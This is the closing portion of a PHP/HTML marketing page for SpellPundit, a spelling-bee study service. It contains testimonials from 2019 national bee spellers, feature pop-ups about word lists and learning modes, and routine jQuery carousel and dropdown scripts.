                        	<img src="img/Keerthana.jpg" class="img-thumbnail" alt="spellpundit" title="Keerthana" width="120px" height="120px">
                        </div>
                         <div class="message text-center blockquote w-100">
                        "SpellPundit is intuitive, easy to use, and a speller’s dream come true. I owe all my success to SpellPundit. In the 12-14 months that I have been using SpellPundit, I have been able to build my foundation and compete with the best. SpellPundit helps me decrease my learning time by more than 75%, which gives me the time to do more within my learning/practice time.

I cannot thank the SpellPundit team and the Dasari family enough. They have been very helpful with my journey and have been invaluable to me on a personal basis. SpellPundit understands what it takes to prepare champions and I recommend SpellPundit as a must-have resource to anyone who wants to participate in spelling competitions."</div>
                        <div class="blockquote-footer w-100 text-white">Keerthana Krishnan, 41st place at 2019 Scripps National Spelling Bee
</div>
                      </div>
                    </div>
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Megan.jpg" class="img-thumbnail" alt="spellpundit" title="Megan" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "My daughter is a relatively new speller (just finished her second year) and has been using SpellPundit since soon after its launch. Having access to word lists identified by level of difficulty has helped her to track her progress and developing ability. SpellPundit also helps her to identify her trouble areas and automatically flags “trouble words” for later review. It’s also been very helpful to be able to access specific study lists for individual competitions. This year, SpellPundit offered weekly practice written tests prior to the Scripps National Spelling Bee, which was a great help, as she could practice using the actual written test format, and we did not have to develop our own practice tests. We have found the SpellPundit team to be extremely approachable, reliable, and committed to improving their product in real time. Over the last year, I have contacted them frequently with questions on how to prepare for a particular competition; they have responded promptly with useful guidance. In addition to their blog, periodic tip-sheets on Facebook and de-briefing posts after competition offer additional insight into the spelling world."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Megan Lynch, 51st Place at 2019 National Spelling Bee
</div>
                      </div>
                    </div>
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Aryan.jpg" class="img-thumbnail" alt="spellpundit" title="Aryan" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "We are very grateful to SpellPundit for making Aryan's Spelling Bee journey effective and memorable. SpellPundit’s vast word list gave Aryan confidence in the Bee and increased his knowledge of word patterns and roots, helping him do well in most of the spelling bee circuits. Without SpellPundit, Aryan wouldn’t have had the confidence to get top 3 in the Wisconsin State Spelling Bee and eventually tie for 51st in the Scripps National Spelling Bee. Overall SpellPundit is a phenomenal resource that helps upcoming spellers to increase their vocabulary and give them confidence to reach the national stage."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Aryan Kalluvila, 51st place at 2019 Scripps National Spelling Bee</div>
                      </div>
                    </div>                  
                    
                  </div>
                </div>  
            </div>
        </div>
    </section>
    <!-- download Section Start -->
	</div>
    <!-- Footer Section Start -->
    <?php include "footer.php" ?>
    <!-- Footer Section End --> 

    <!-- Go To Top Link -->
    <a href="#" class="back-to-top">
      <i class="lni-chevron-up"></i>
    </a> 

    <!-- Preloader -->
    <!-- <div id="preloader">
      <div class="loader" id="loader-1"></div>
    </div> -->
    <!-- End Preloader -->
	<!-- Search Modal Start -->
        <div aria-hidden="true" class="modal fade search-modal1" role="dialog" tabindex="-1">
        	<!--<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true" class="fa fa-close"></span></button>-->
            <div class="modal-dialog modal-dialog-centered inline-eleven">
                <div class="modal-content">
                    <div class="search-block clearfix">
                        <div class="log-in-pop comprehensive">
                        	<a href="#" class="pop-close" data-dismiss="modal"><img src="img/cancel.png" alt="spellpundit" class="img-responsive" alt="spellpundit" width="64px" height="64px"></a>
                            <div class="inline-twelve">
                        		<h5 class="inline-thirteen">Comprehensive Word Lists</h5>
                                <p>At SpellPundit, we have condensed down the entire Merriam Webster Online Unabridged Dictionary to only the words you need to know for spelling bee preparation, arranged by increasing difficulty. This even includes words that have recently been added to the online dictionary!</p>
                                <p>Every word in SpellPundit has all of the necessary information included, such as audio pronunciations, part of speech, language of origin, and definition. Additionally, most words also have a hint (typically language patterns or roots associated with the word) to facilitate learning.</p>
                                <p>In addition to spelling, we also provide word lists to prepare vocabulary, roots, homonyms, and phrased/hyphenated words.</p>
                                <p>We believe that SpellPundit is the only resource you need to succeed in spelling and vocabulary bees.   In the last 10 years, 99.9% of words asked at the Scripps National Spelling Bee, North South Foundation Spelling Bee, South Asian Spelling Bee, North American Spelling Champion Challenge, Spandana Spelling Bee, or affiliated bees are in SpellPundit.

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div aria-hidden="true" class="modal fade search-modal2" role="dialog" tabindex="-1">
        	<!--<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true" class="fa fa-close"></span></button>-->
            <div class="modal-dialog modal-dialog-centered inline-fourteen">
                <div class="modal-content">
                    <div class="search-block clearfix">
                        <div class="log-in-pop comprehensive">
                        	<a href="#" class="pop-close" data-dismiss="modal"><img src="img/cancel.png" alt="spellpundit" class="img-responsive" alt="spellpundit" width="64px" height="64px"></a>
                            <div class="inline-fifteen">
                        		<h5 class="inline-sixteen">Easy to Use</h5>
                                <p>SpellPundit has a user-friendly interface that can be used in both desktop and mobile browsers, allowing for easy preparation almost anywhere in the world.</p>
                                <p>SpellPundit’s spelling and vocabulary word lists are also arranged by increasing difficulty, which allows spellers to learn words in a logical sequence.</p>
                                <p>Lastly, SpellPundit facilitates self-learning. Because the software allows the speller to test themselves on every word set, a speller can learn words and review their mistakes without a 
                                parent or coach.</p>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div aria-hidden="true" class="modal fade search-modal3" role="dialog" tabindex="-1">
        	<!--<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true" class="fa fa-close"></span></button>-->
            <div class="modal-dialog modal-dialog-centered inline-seventeen">
                <div class="modal-content">
                    <div class="search-block clearfix">
                        <div class="log-in-pop comprehensive">
                        	<a href="#" class="pop-close" data-dismiss="modal"><img src="img/cancel.png" alt="spellpundit" class="img-responsive" alt="spellpundit" width="64px" height="64px"></a>
                            <div class="inline-eighteen">
                        		<h5 class="inline-ninteen">Fast and Accurate Preparation</h5>
                              <p> SpellPundit offers the opportunity for each set to be prepared in both Learning and Testing Modes.</p> 

                              <p>In Learning Mode, the speller is provided with the word and all its information (audio pronunciations, part of speech, language of origin, definition) in a flashcard format. The word may also include a “hint,” which are usually language patterns or roots associated with the word, to facilitate their learning of the word. </p>

                              <p>In Testing Mode, the speller is provided with all the word’s information (audio pronunciations, part of speech, language of origin, definition) and must type in the correct spelling of the word. In Testing Mode, the speller actively interacts with every word by typing it, which improves their retention of the word sets. This ability for active learning sets SpellPundit apart from traditional study methods where spellers passively read through word lists.</p>

                              <p>SpellPundit’s software automatically tracks all the words a speller misspells and provides spellers with the option to review only their previously misspelled words in future attempts. Spellers are also given the option to “flag” words in each set and prepare these words separately. This allows the speller to focus on only the words they don’t know or are unsure on, allowing for faster and more effective preparation.</p>

                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    <!-- Search Modal End --> 
    <!-- jQuery first, then Tether, then Bootstrap JS. -->
    <style type="text/css">
            .flexslider2 .flex-direction-nav, .flexslider2 .flex-control-nav
            {
                display:none;
            }
    </style>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
    <!--<script src="js/jquery-min.js"></script>-->
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/owl.carousel.js"></script> 
    <script src="js/jquery.mixitup.js"></script>       
    <script src="js/jquery.nav.js"></script>    
    <!--<script src="js/scrolling-nav.js"></script>-->    
    <script src="js/jquery.easing.min.js"></script>     
    <script src="js/wow.js"></script>   
    <script src="js/jquery.counterup.min.js"></script>     
    <script src="js/nivo-lightbox.js"></script>     
    <script src="js/jquery.magnific-popup.min.js"></script>  
    <script src="js/main.js"></script>   
    <script src="js/hm-slider-main.js"></script>
    <script src="js/jquery.flexslider-min.js"></script>
    <script src="js/ie10-viewport-bug-workaround.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
	<script type="text/javascript">
	        $(document).ready(function() {
              $(".testimonial-carousel").slick({
                infinite: true,
                slidesToShow: 1,
                slidesToScroll: 1,
                autoplay: false,
                arrows: true,
                prevArrow: $(".testimonial-carousel-controls .prev"),
                nextArrow: $(".testimonial-carousel-controls .next")
              });
            });
	</script>
    <script>
	$(document).ready(function () {
		$('.flexslider').flexslider({
			animation: 'slide',
			controlsContainer: '.flexslider'
		});
		$('.flexslider2').flexslider({
			animation: 'slide',
			controlsContainer: '.flexslider2',
            arrows: false
		});
	});
	</script>
    <script>
	$(document).ready(function() {
            enableSelectBoxes();
        });
        
        function enableSelectBoxes() {
            $('div.selectBox').each(function() {
                let selectBox = $(this);
                let selectedSpan = selectBox.children('span.selected');
                let selectOptions = selectBox.children('div.selectOptions');
                
                // Click to toggle main dropdown
                selectBox.children('span.selected, span.selectArrow').click(function(event) {
                    event.stopPropagation();
                    $('.selectOptions').not(selectOptions).hide(); // Hide other dropdowns
                    selectOptions.toggle();
                });
        
                // Click to open sub-menu
                $('.hasSubMenu').click(function(event) {
                    event.stopPropagation();
                    let subMenu = $(this).find('.subMenu');
                    $('.subMenu').not(subMenu).hide(); // Hide other submenus
                    subMenu.toggle();
                });
        
                // Click to navigate (sub-options)
                $('.subOption a').click(function(event) {
                    event.stopPropagation();
                    window.location.href = $(this).attr('href'); // Navigate to selected page
                });
            });
        
            // Click outside to close dropdowns
            $(document).click(function() {
                $('.selectOptions, .subMenu').hide();
            });
        }

	</script>
</body>
</html>
